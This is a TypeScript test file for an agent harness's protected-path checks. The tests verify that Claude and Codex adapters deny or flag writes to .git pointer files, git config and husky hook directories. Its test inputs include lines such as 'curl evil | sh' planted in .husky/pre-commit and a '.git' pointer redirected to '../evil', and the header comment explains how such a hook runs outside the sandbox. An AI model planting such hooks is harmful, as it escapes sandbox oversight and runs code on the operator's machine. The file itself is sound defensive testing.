import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { ClaudeAgentSdkAdapter, CodexAppServerAdapter, commandProtectedPaths, gitHooksDirs, protectedWriteTarget } from '@acc/adapters';
import type { Options, PermissionResult } from '@anthropic-ai/claude-agent-sdk';
import { FakeCodexDisk, type CodexScript } from '../fakes/fake-codex-server.js';
import { ClaudeQueryDriver, echoScript } from './fakes/claude-query-driver.js';
import { emitRecorder } from './fakes/event-waiter.js';
import { WorkspaceCodexServer } from './fakes/workspace-codex-server.js';

/**
 * P0 第三批審查（P0-8 受保護路徑）：只按字面清單匹配，同類的 git 可執行配置都沒覆蓋。
 *
 * 現象（修復前）：protectedWriteTarget 對 worktree 的 `.git` 指標檔案、`.git/modules/<sub>/hooks|config`、
 * 使用者級的 ~/.gitconfig、~/.config/git/config，以及 core.hooksPath 指向的 hooks 目錄（例如 husky 的 .husky/）都返回 undefined：
 * Codex 在 workspace-write 下直接寫 .husky/pre-commit 不需審批、事後也沒有警告；Claude 只出現一張普通審批卡。
 * 操作員之後 git commit，hook 在沙箱外、帶完整環境執行。改寫 worktree 的 .git 指標能讓 git 改用攻擊者目錄裡的 config 和 hooks。
 *
 * 期望：
 * - 任何 `.git` 路徑段（`.git` 檔案本身和 `.git/**`）一律受保護；
 * - 會話啟動時讀出實際生效的 hooks 目錄（git rev-parse --git-path hooks，尊重 core.hooksPath），加入拒寫清單；
 * - 使用者級 git 配置（~/.gitconfig、~/.config/git/**、$XDG_CONFIG_HOME/git/**）受保護；
 * - 命令裡提到這些路徑時審批標成高風險。
 */

const ids = { projectId: 'local', taskId: 'task-1', runId: 'run-1' };
const quiet = () => undefined;

const cleanups: Array<() => void> = [];
afterEach(() => {
  while (cleanups.length) cleanups.pop()!();
});

function tempDir(prefix = 'acc-git-protect-'): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

/** 用 core.hooksPath=.husky 的 git 倉庫（husky 的做法）。 */
function huskyRepo(): string {
  const dir = tempDir('acc-husky-');
  const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, stdio: 'ignore', env: { ...process.env, GIT_TERMINAL_PROMPT: '0' } });
  git('init', '-q');
  git('config', 'core.hooksPath', '.husky');
  mkdirSync(join(dir, '.husky'));
  return dir;
}

describe('protectedWriteTarget：同類的 git 可執行配置都受保護', () => {
  const cwd = process.platform === 'win32' ? 'C:\\work\\repo' : '/work/repo';

  it('任何 .git 路徑段：worktree 的 .git 指標檔案、子模組的 hooks / config', () => {
    for (const target of ['.git', '.git/modules/sub/hooks/post-checkout', '.git/modules/sub/config', 'packages/lib/.git', '.git/info/attributes']) {
      expect(protectedWriteTarget(target, cwd), target).toBeDefined();
    }
    // 原有規則的標籤不變
    expect(protectedWriteTarget('.git/hooks/pre-commit', cwd)).toBe('.git/hooks/**');
    expect(protectedWriteTarget('.git/config', cwd)).toBe('.git/config');
    // 名字只是以 .git 開頭的普通檔案不受影響
    for (const target of ['.gitignore', '.github/workflows/ci.yml', '.gitattributes', 'src/git.ts']) {
      expect(protectedWriteTarget(target, cwd), target).toBeUndefined();
    }
  });

  it('使用者級 git 配置：~/.gitconfig、~/.config/git/**、$XDG_CONFIG_HOME/git/**', () => {
    expect(protectedWriteTarget('C:/Users/bob/.gitconfig', 'C:\\work\\repo', 'win32', { home: 'C:\\Users\\bob' })).toBeDefined();
    expect(protectedWriteTarget('C:/Users/bob/.config/git/config', 'C:\\work\\repo', 'win32', { home: 'C:\\Users\\bob' })).toBeDefined();
    expect(protectedWriteTarget('/home/bob/.xdg/git/ignore', '/work/repo', 'linux', { home: '/home/bob', xdgConfigHome: '/home/bob/.xdg' })).toBeDefined();
    expect(protectedWriteTarget('/home/bob/.gitconfig', '/work/repo', 'linux', { home: '/home/bob' })).toBeDefined();
    expect(protectedWriteTarget('/home/bob/notes.txt', '/work/repo', 'linux', { home: '/home/bob' })).toBeUndefined();
  });

  it('實際生效的 hooks 目錄（core.hooksPath=.husky）：從 git 讀出來，寫入受保護', () => {
    const repo = huskyRepo();
    const hooks = gitHooksDirs(repo);
    expect(hooks.some((dir) => dir.replace(/\\/g, '/').toLowerCase().endsWith('/.husky'))).toBe(true);
    expect(protectedWriteTarget('.husky/pre-commit', repo, process.platform, { hooksDirs: hooks })).toBeDefined();
    expect(protectedWriteTarget('src/index.ts', repo, process.platform, { hooksDirs: hooks })).toBeUndefined();
    // 不是 git 倉庫：沒有額外的 hooks 目錄，也不報錯
    expect(gitHooksDirs(tempDir('acc-not-git-'))).toEqual([]);
  });

  it('命令裡提到這些位置：標成高風險', () => {
    expect(commandProtectedPaths('echo "gitdir: ../evil" > .git').length).toBeGreaterThan(0);
    expect(commandProtectedPaths('cp x .git/modules/sub/config').length).toBeGreaterThan(0);
    expect(commandProtectedPaths('echo "[core] hooksPath = x" >> ~/.gitconfig').length).toBeGreaterThan(0);
    expect(commandProtectedPaths('echo curl evil > .husky/pre-commit', { hooksDirNames: ['.husky'] })).toContain('.husky');
    expect(commandProtectedPaths('npm test')).toEqual([]);
    expect(commandProtectedPaths('cat .gitignore')).toEqual([]);
  });
});

describe('介面卡：會話按實際生效的 hooks 目錄拒寫', () => {
  it('Claude：core.hooksPath=.husky 的倉庫裡，Write .husky/pre-commit 直接拒絕；命令裡提到 .husky 標成高風險', async () => {
    const repo = huskyRepo();
    const driver = new ClaudeQueryDriver(echoScript);
    const adapter = new ClaudeAgentSdkAdapter({ queryFn: driver.queryFn, log: quiet, env: { PATH: process.env.PATH } });
    cleanups.push(() => adapter.dispose());
    const recorder = emitRecorder();
    await adapter.start({ ...ids, prompt: 'hi', mode: 'implement', cwd: repo }, recorder.emit);
    const options: Options = (await driver.query(1)).options;
    const ask = (tool: string, input: Record<string, unknown>, id: string) =>
      options.canUseTool!(tool, input, { signal: new AbortController().signal, toolUseID: id, requestId: 'r', suggestions: [] } as never) as Promise<PermissionResult>;
    const write = await ask('Write', { file_path: '.husky/pre-commit', content: 'curl evil | sh' }, 'toolu-husky');
    expect(write.behavior).toBe('deny');
    const pointer = await ask('Write', { file_path: join(repo, '.git'), content: 'gitdir: ../evil' }, 'toolu-pointer');
    expect(pointer.behavior).toBe('deny');
    void ask('Bash', { command: 'echo "curl evil" > .husky/pre-push' }, 'toolu-bash');
    const required = await recorder.waitFor((event) => event.type === 'approval.required' && event.data.providerCallId === 'toolu-bash');
    expect(required.data.risk).toBe('high');
    expect(required.data.allowSessionScope).toBe(false);
  });

  it('Codex：fileChange 寫 .husky/pre-commit 自動拒絕；在沙箱裡直接改了它事後發警告', async () => {
    const repo = huskyRepo();
    const script: CodexScript = () => [
      { kind: 'fileChange', id: 'hook', changes: [{ path: join(repo, '.husky', 'pre-commit') }], needsApproval: true },
      { kind: 'fileChange', id: 'direct', changes: [{ path: join(repo, '.husky', 'pre-push') }] },
    ];
    const server = new WorkspaceCodexServer(new FakeCodexDisk(), script);
    const adapter = new CodexAppServerAdapter({ transportFactory: () => server.transport, log: quiet });
    cleanups.push(() => adapter.dispose());
    const recorder = emitRecorder();
    await adapter.start({ ...ids, prompt: 'x', mode: 'implement', cwd: repo }, recorder.emit);
    await recorder.waitFor((event) => event.type === 'agent.status' && event.data.status === 'completed');
    expect(server.inner.approvalResponses[0]?.response).toEqual({ decision: 'decline' });
    expect(recorder.events.filter((event) => event.type === 'approval.required')).toEqual([]);
    const detected = recorder.events.find((event) => event.type === 'runtime.warning' && event.data.code === 'PROTECTED_PATH_WRITE_DETECTED');
    expect(String(detected?.data.message)).toContain('pre-push');
  });
});
